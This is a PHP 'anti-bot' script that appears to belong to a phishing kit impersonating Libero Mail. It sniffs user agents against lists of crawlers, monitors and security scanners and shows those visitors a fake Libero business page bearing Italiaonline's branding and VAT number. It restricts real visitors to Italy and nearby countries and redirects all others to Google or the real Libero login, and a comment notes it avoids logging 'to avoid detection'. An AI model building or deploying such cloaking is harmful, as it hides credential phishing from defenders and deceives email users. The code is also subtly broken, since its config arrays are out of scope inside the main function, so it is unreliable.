<?php
/**
 * Clean Anti-Bot Protection System
 * Only GeoIP filtering + Bot detection - No aggressive security features
 */

// Start session for tracking
session_start();

// Configuration - Only essential settings
$ALLOWED_COUNTRIES = [
    'IT', // Italy
    'FR', // France
    'CH', // Switzerland
    'AT', // Austria
    'SI', // Slovenia
    'SM', // San Marino
    'VA', // Vatican City
    'MC', // Monaco
    'HR', // Croatia
    'ME', // Montenegro
    'AL', // Albania
    'GR', // Greece
    'MT', // Malta
    'CY', // Cyprus
];

$REDIRECT_URLS = [
    'default' => 'https://www.google.com',
    'libero' => 'https://login.libero.it/login.phtml'
];

// Function to get client IP address (simple version)
function getClientIP() {
    $ipKeys = ['HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    
    foreach ($ipKeys as $key) {
        if (isset($_SERVER[$key]) && !empty($_SERVER[$key])) {
            $ip = trim($_SERVER[$key]);
            if (filter_var($ip, FILTER_VALIDATE_IP) !== false) {
                return $ip;
            }
        }
    }
    
    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

// Function to get country from IP (using only reliable services)
function getCountryFromIP($ip) {
    // Only use the most reliable free service
    $service = 'http://ip-api.com/json/' . $ip . '?fields=countryCode';
    
    try {
        $context = stream_context_create([
            'http' => [
                'timeout' => 2,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]
        ]);
        
        $response = @file_get_contents($service, false, $context);
        if ($response !== false) {
            $data = json_decode($response, true);
            if ($data && isset($data['countryCode'])) {
                return $data['countryCode'];
            }
        }
    } catch (Exception $e) {
        // Silent fail - allow access if we can't determine country
    }
    
    return null;
}

// Enhanced bot detection with more patterns
function isBot() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Comprehensive bot patterns
    $botPatterns = [
        // Search engines
        '/Googlebot|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Sogou|facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|TelegramBot|Discordbot/i',
        
        // SEO tools (extended list)
        '/AhrefsBot|SemrushBot|MJ12bot|DotBot|rogerbot|Exabot|ia_archiver|archive.org|Baiduspider|YandexBot|Sogou|facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|TelegramBot|Discordbot|Slackbot|SkypeUriPreview|WhatsApp|Telegram|Discord|Slack/i',
        
        // Social media crawlers
        '/facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|TelegramBot|Discordbot|Slackbot|SkypeUriPreview|Pinterest|Instagram|Snapchat|TikTok|Reddit|Tumblr/i',
        
        // Analytics and monitoring
        '/Pingdom|GTmetrix|PageSpeed|Lighthouse|WebPageTest|GTmetrix|UptimeRobot|Site24x7|NewRelic|Datadog|PagerDuty|StatusCake|Uptime|Monitor/i',
        
        // Cloudflare and CDN
        '/Cloudflare|CFNetwork|Fastly|Akamai|CloudFront|MaxCDN|BunnyCDN|KeyCDN|StackPath|CDN77|BunnyCDN|KeyCDN|StackPath|CDN77/i',
        
        // Web scrapers and automation
        '/Scrapy|Selenium|Puppeteer|Playwright|HeadlessChrome|PhantomJS|CasperJS|Nightmare|Zombie|Cheerio|BeautifulSoup|Requests|urllib|curl|wget/i',
        
        // Security scanners
        '/Nmap|Nessus|OpenVAS|Qualys|Rapid7|Acunetix|Burp|OWASP|ZAP|Nikto|Dirb|Gobuster|Wfuzz|SQLMap|Metasploit|Nuclei|Subfinder|Amass|Masscan|Zmap/i',
        
        // Other common bots
        '/bot|crawler|spider|scraper|monitor|checker|validator|analyzer|indexer|harvester|collector|extractor|parser|fetcher|downloader|uploader|sync|backup|mirror|proxy|vpn|tor|anonymizer/i'
    ];
    
    foreach ($botPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    
    return false;
}

// Function to serve bot content (SEO-friendly business content)
function serveBotContent() {
    $botContent = '
    <!DOCTYPE html>
    <html lang="it">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Libero Mail - Servizi Professionali di Posta Elettronica e Marketing Digitale</title>
        <meta name="description" content="Libero Mail offre servizi di posta elettronica professionali, marketing digitale e soluzioni aziendali complete. Scopri i nostri servizi premium per la tua azienda.">
        <meta name="keywords" content="libero mail, email professionale, marketing digitale, servizi aziendali, posta elettronica sicura, hosting, dominio, cloud, sicurezza informatica">
        <meta name="robots" content="index, follow">
        <meta name="author" content="ITALIAONLINE S.p.A.">
        <meta property="og:title" content="Libero Mail - Servizi Professionali">
        <meta property="og:description" content="Soluzioni complete per la comunicazione aziendale e il marketing digitale">
        <meta property="og:type" content="website">
        <meta property="og:url" content="https://www.libero.it">
        <link rel="canonical" href="https://www.libero.it/servizi-professionali">
        
        <style>
            body { 
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
                margin: 0; 
                padding: 20px; 
                line-height: 1.6; 
                background: #f8f9fa;
                color: #333;
            }
            .container { 
                max-width: 1200px; 
                margin: 0 auto; 
                background: white;
                border-radius: 12px;
                box-shadow: 0 2px 20px rgba(0,0,0,0.1);
                overflow: hidden;
            }
            .header { 
                background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%); 
                color: white; 
                padding: 40px 30px; 
                text-align: center;
            }
            .header h1 { 
                margin: 0 0 15px 0; 
                font-size: 2.5em; 
                font-weight: 300;
            }
            .header p { 
                margin: 0; 
                font-size: 1.2em; 
                opacity: 0.9;
            }
            .services-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
                gap: 30px;
                padding: 40px 30px;
            }
            .service-card { 
                border: 1px solid #e9ecef; 
                padding: 30px; 
                border-radius: 12px; 
                transition: all 0.3s ease;
                background: white;
            }
            .service-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            }
            .service-card h3 { 
                color: #0066cc; 
                margin-top: 0; 
                font-size: 1.4em;
                border-bottom: 2px solid #e9ecef;
                padding-bottom: 15px;
            }
            .service-card p {
                color: #6c757d;
                margin-bottom: 20px;
            }
            .cta-button { 
                background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%); 
                color: white; 
                padding: 12px 24px; 
                text-decoration: none; 
                border-radius: 25px; 
                display: inline-block; 
                font-weight: 500;
                transition: all 0.3s ease;
                border: none;
                cursor: pointer;
            }
            .cta-button:hover { 
                background: linear-gradient(135deg, #0052a3 0%, #003d7a 100%);
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0,102,204,0.3);
            }
            .features-section {
                background: #f8f9fa;
                padding: 40px 30px;
                text-align: center;
            }
            .features-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 30px;
                margin-top: 30px;
            }
            .feature-item {
                padding: 20px;
                background: white;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            }
            .feature-item h4 {
                color: #0066cc;
                margin-top: 0;
            }
            footer { 
                text-align: center; 
                padding: 30px; 
                background: #343a40;
                color: white;
            }
            footer a {
                color: #6c757d;
                text-decoration: none;
                margin: 0 10px;
            }
            footer a:hover {
                color: #0066cc;
            }
            @media (max-width: 768px) {
                .services-grid {
                    grid-template-columns: 1fr;
                    padding: 20px;
                }
                .header {
                    padding: 30px 20px;
                }
                .header h1 {
                    font-size: 2em;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Libero Mail - Servizi Professionali</h1>
                <p>Soluzioni complete per la comunicazione aziendale e il marketing digitale</p>
            </div>
            
            <div class="services-grid">
                <div class="service-card">
                    <h3>📧 Posta Elettronica Aziendale</h3>
                    <p>Servizi di email professionale con dominio personalizzato, archiviazione sicura fino a 100GB, sincronizzazione multi-dispositivo e supporto tecnico dedicato. Ideale per aziende di tutte le dimensioni.</p>
                    <a href="https://www.libero.it/servizi-aziendali" class="cta-button">Scopri di Più</a>
                </div>
                
                <div class="service-card">
                    <h3>🎯 Marketing Digitale e Pubblicità</h3>
                    <p>Campagne pubblicitarie mirate, SEO avanzato, gestione social media, email marketing e analisi delle performance in tempo reale. Aumenta la visibilità della tua azienda online.</p>
                    <a href="https://www.libero.it/marketing-digitale" class="cta-button">Richiedi Consulenza</a>
                </div>
                
                <div class="service-card">
                    <h3>☁️ Soluzioni Cloud e Sicurezza</h3>
                    <p>Infrastrutture cloud scalabili, backup automatici, protezione DDoS avanzata, certificazioni di sicurezza ISO 27001 e compliance GDPR. La tua azienda al sicuro nel cloud.</p>
                    <a href="https://www.libero.it/cloud-security" class="cta-button">Prova Gratis</a>
                </div>
                
                <div class="service-card">
                    <h3>🔧 Supporto Tecnico 24/7</h3>
                    <p>Assistenza tecnica specializzata disponibile 24 ore su 24, 7 giorni su 7. Team di esperti certificati per risolvere qualsiasi problema tecnico in tempo reale.</p>
                    <a href="https://aiuto.libero.it" class="cta-button">Contatta Supporto</a>
                </div>
                
                <div class="service-card">
                    <h3>💼 Hosting e Domini</h3>
                    <p>Hosting web veloce e affidabile, registrazione domini, certificati SSL gratuiti, database MySQL e supporto per applicazioni PHP, Node.js e Python.</p>
                    <a href="https://www.libero.it/hosting" class="cta-button">Confronta Prezzi</a>
                </div>
                
                <div class="service-card">
                    <h3>📱 App e Sviluppo Web</h3>
                    <p>Sviluppo di applicazioni web personalizzate, e-commerce, siti responsive, API REST e integrazioni con sistemi aziendali esistenti.</p>
                    <a href="https://www.libero.it/sviluppo-web" class="cta-button">Richiedi Preventivo</a>
                </div>
            </div>
            
            <div class="features-section">
                <h2>Perché Scegliere Libero Mail?</h2>
                <div class="features-grid">
                    <div class="feature-item">
                        <h4>🚀 Performance</h4>
                        <p>Server di ultima generazione con SSD e CDN globale per velocità massima</p>
                    </div>
                    <div class="feature-item">
                        <h4>🔒 Sicurezza</h4>
                        <p>Protezione DDoS, firewall avanzato e backup automatici ogni ora</p>
                    </div>
                    <div class="feature-item">
                        <h4>💎 Affidabilità</h4>
                        <p>99.9% di uptime garantito con SLA e supporto tecnico dedicato</p>
                    </div>
                    <div class="feature-item">
                        <h4>💰 Convenienza</h4>
                        <p>Piani flessibili senza costi nascosti e sconti per volumi elevati</p>
                    </div>
                </div>
            </div>
            
            <footer>
                <p><strong>&copy; 2025 ITALIAONLINE S.p.A.</strong> - Tutti i diritti riservati - P. IVA 03970540963</p>
                <p>
                    <a href="https://www.libero.it">Libero.it</a> | 
                    <a href="https://privacy.italiaonline.it">Privacy</a> | 
                    <a href="https://info.libero.it/note-legali/">Note Legali</a> | 
                    <a href="https://aiuto.libero.it">Supporto</a> | 
                    <a href="https://www.libero.it/contatti">Contatti</a>
                </p>
            </footer>
        </div>
    </body>
    </html>';
    
    return $botContent;
}

// Main protection logic (simplified)
function runProtection() {
    // Check if this is a bot first
    if (isBot()) {
        echo serveBotContent();
        exit;
    }
    
    // Get client IP and country
    $clientIP = getClientIP();
    $country = getCountryFromIP($clientIP);
    
    // If we can\'t determine country, allow access (fail-safe)
    if ($country === null) {
        return true;
    }
    
    // Check if country is allowed
    if (!in_array($country, $ALLOWED_COUNTRIES)) {
        // Simple redirect without logging (to avoid detection)
        $redirectUrl = isset($_GET['redirect']) && $_GET['redirect'] === 'libero' 
            ? $REDIRECT_URLS['libero'] 
            : $REDIRECT_URLS['default'];
            
        header('Location: ' . $redirectUrl);
        exit;
    }
    
    // Allow access for allowed countries
    return true;
}

// Run protection
runProtection();
?>
